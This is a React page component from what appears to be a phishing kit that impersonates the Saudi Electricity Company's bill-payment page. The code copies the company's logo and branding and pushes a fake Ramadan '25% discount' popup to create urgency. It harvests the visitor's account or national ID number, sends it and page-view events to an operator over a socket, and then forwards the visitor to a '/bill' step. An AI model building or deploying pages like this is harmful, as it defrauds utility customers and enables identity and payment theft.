import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function FahsHome() {
  const [accountNumber, setAccountNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    socket.value.emit("visitor:pageView", { page: "home", url: window.location.href });
  }, []);

  // Show popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);



  const handleSubmit = () => {
    if (!accountNumber.trim()) return;
    setIsLoading(true);
    socket.value.emit("visitor:formSubmit", {
      page: "home",
      data: { accountNumber }
    });
    sessionStorage.setItem("accountNumber", accountNumber);
    setTimeout(() => {
      setIsLoading(false);
      setLocation('/bill');
    }, 2000);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleSubmit();
  };

  return (
    <>
      {/* SE Font */}
      <style>{`
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-SemiBold.woff2') format('woff2');
          font-weight: 600;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Light.woff2') format('woff2');
          font-weight: 300;
          font-style: normal;
        }
        input::placeholder {
          color: #001f5e !important;
          opacity: 1 !important;
        }
        input:focus {
          border: 2px solid #06c !important;
          box-shadow: 0 0 0 4px rgba(0, 102, 204, 0.15) !important;
          background: #fff !important;
        }
        @keyframes popupFadeIn {
          from { opacity: 0; transform: scale(0.9) translateY(20px); }
          to { opacity: 1; transform: scale(1) translateY(0); }
        }
      `}</style>

      <div
        className="min-h-screen bg-white"
        dir="rtl"
        style={{ fontFamily: "'SE', sans-serif" }}
      >
        {/* Ramadan Popup */}
        {showPopup && (
          <div className="fixed inset-0 z-50 flex items-center justify-center" style={{ backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(4px)' }} onClick={() => setShowPopup(false)}>
            <div style={{
              background: '#fff',
              borderRadius: '20px',
              boxShadow: '0 25px 60px rgba(0,0,0,0.3)',
              maxWidth: '400px',
              width: '90%',
              margin: '0 auto',
              overflow: 'hidden',
              animation: 'popupFadeIn 0.4s ease-out',
            }} onClick={(e) => e.stopPropagation()}>
              {/* Ramadan Image Header */}
              <div style={{ position: 'relative' }}>
                <img src="/images/ramadan-header.jpg" alt="رمضان كريم" style={{ width: '100%', display: 'block', height: '200px', objectFit: 'cover' }} />
              </div>

              {/* Content */}
              <div style={{ padding: '28px 24px 24px', textAlign: 'center' }}>
                <h3 style={{
                  fontFamily: "'SE', sans-serif",
                  fontSize: '24px',
                  fontWeight: 700,
                  color: '#001f5e',
                  marginBottom: '20px',
                }}>بمناسبة الشهر الفضيل</h3>

                {/* Discount Box */}
                <div style={{
                  background: 'linear-gradient(135deg, #0066cc 0%, #004a99 100%)',
                  borderRadius: '16px',
                  padding: '22px 20px',
                  marginBottom: '18px',
                  position: 'relative',
                  overflow: 'hidden',
                }}>
                  <div style={{ position: 'absolute', top: '-20px', right: '-20px', width: '80px', height: '80px', borderRadius: '50%', background: 'rgba(255,255,255,0.08)' }}></div>
                  <div style={{ position: 'absolute', bottom: '-15px', left: '-15px', width: '60px', height: '60px', borderRadius: '50%', background: 'rgba(255,255,255,0.05)' }}></div>
                  <p style={{
                    fontFamily: "'SE', sans-serif",
                    fontSize: '32px',
                    fontWeight: 700,
                    color: '#fff',
                    marginBottom: '4px',
                    letterSpacing: '1px',
                  }}>خصم 25%</p>
                  <p style={{
                    fontFamily: "'SE', sans-serif",
                    fontSize: '15px',
                    fontWeight: 400,
                    color: 'rgba(255,255,255,0.85)',
                  }}>عند دفع كامل المبلغ</p>
                </div>

                <p style={{
                  fontFamily: "'SE', sans-serif",
                  fontSize: '14px',
                  fontWeight: 400,
                  color: '#8899b4',
                  marginBottom: '22px',
                }}>لآخر يوم من أيام الشهر الفضيل</p>

                <button
                  onClick={() => setShowPopup(false)}
                  style={{
                    fontFamily: "'SE', sans-serif",
                    width: '80%',
                    padding: '14px 0',
                    fontSize: '17px',
                    fontWeight: 600,
                    color: '#fff',
                    backgroundColor: '#0066cc',
                    border: 'none',
                    borderRadius: '12px',
                    cursor: 'pointer',
                    transition: 'background-color 0.2s',
                    boxShadow: '0 4px 15px rgba(0,102,204,0.3)',
                  }}
                >
                  إغلاق
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Header - Logo right, X left */}
        <div
          style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            height: '70px',
            padding: '15px 55px 14px',
          }}
        >
          {/* Logo - Right */}
          <a href="#" style={{ display: 'block', border: 0, outline: 0 }}>
            <img
              src="/se-logo.svg"
              alt="السعودية للطاقة"
              style={{ width: '90px', height: '58px', objectFit: 'contain' }}
            />
          </a>

          {/* Close - Left */}
          <button
            onClick={() => window.location.reload()}
            style={{
              background: '#e8f0fe',
              border: 'none',
              cursor: 'pointer',
              padding: '10px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              borderRadius: '12px',
              width: '44px',
              height: '44px',
            }}
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        {/* Main Content */}
        <div
          style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            paddingTop: '80px',
            paddingLeft: '20px',
            paddingRight: '20px',
          }}
        >
          {/* Title */}
          <h1
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 600,
              fontSize: '40px',
              lineHeight: '1.3',
              color: '#001f5e',
              marginBottom: '10px',
              textAlign: 'center',
              letterSpacing: 0,
            }}
          >
            عرض ودفع الفواتير
          </h1>

          {/* Description */}
          <p
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 400,
              fontSize: '18px',
              lineHeight: '1.6',
              color: '#66799e',
              textAlign: 'center',
              maxWidth: '500px',
              marginBottom: '40px',
            }}
          >
            يرجى إدخال رقم حسابك لعرض ومتابعة دفع فاتورتك. يمكنك أيضًا{' '}
            <a
              href="#"
              style={{
                color: '#06c',
                textDecoration: 'underline',
                fontWeight: 400,
              }}
            >
              تسجيل الدخول
            </a>
            {' '}للحصول على المزيد من الخدمات
          </p>

          {/* Form */}
          <div style={{ width: '100%', maxWidth: '460px' }}>
            {/* Label */}
            <label
              style={{
                display: 'block',
                fontFamily: "'SE', sans-serif",
                fontSize: '16px',
                fontWeight: 400,
                color: '#66799e',
                marginBottom: '4px',
                textAlign: 'right',
              }}
            >
              رقم الحساب أو الهوية
            </label>

            {/* Input - box style with background */}
            <div style={{ position: 'relative' }}>
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, '');
                  if (val.length <= 11) setAccountNumber(val);
                }}
                inputMode="numeric"
                maxLength={11}
                onKeyDown={handleKeyDown}
                placeholder=""
                style={{
                  width: '100%',
                  fontFamily: "'SE', sans-serif",
                  fontSize: '18px',
                  fontWeight: 400,
                  color: '#001f5e',
                  padding: '6px 16px',
                  border: 'none',
                  borderRadius: '12px',
                  outline: 'none',
                  background: '#f5f6f9',
                  textAlign: 'right',
                  direction: 'rtl',
                  boxSizing: 'border-box' as const,
                }}
              />
              {!accountNumber && (
                <span
                  style={{
                    position: 'absolute',
                    top: '6px',
                    right: '16px',
                    fontFamily: "'SE', sans-serif",
                    fontSize: '18px',
                    fontWeight: 400,
                    color: '#66799e',
                    pointerEvents: 'none',
                  }}
                >
                  مثال: 12345678901
                </span>
              )}
            </div>

            {/* Submit Button */}
            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <button
              onClick={handleSubmit}
              disabled={accountNumber.trim().length !== 11 || isLoading}
              style={{
                marginTop: '30px',
                fontFamily: "'SE', sans-serif",
                fontSize: '18px',
                fontWeight: 400,
                lineHeight: '150%',
                padding: '10px 15px 8px',
                minWidth: '50px',
                borderRadius: '12px',
                border: '1px solid transparent',
                cursor: (accountNumber.trim().length !== 11 || isLoading) ? 'default' : 'pointer',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                textDecoration: 'none',
                transition: 'color 0.5s, background-color 0.5s',
                backgroundColor: (accountNumber.trim().length !== 11 || isLoading) ? '#f5f6f9' : '#06c',
                color: (accountNumber.trim().length !== 11 || isLoading) ? '#e6e9ef' : '#fff',
                pointerEvents: (accountNumber.trim().length !== 11 || isLoading) ? 'none' as const : 'auto' as const,
                userSelect: 'none' as const,
              }}
            >
              {isLoading ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <svg className="animate-spin" style={{ width: '20px', height: '20px' }} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path style={{ opacity: 0.75 }} fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  جاري التحقق...
                </span>
              ) : (
                'استمر'
              )}
            </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
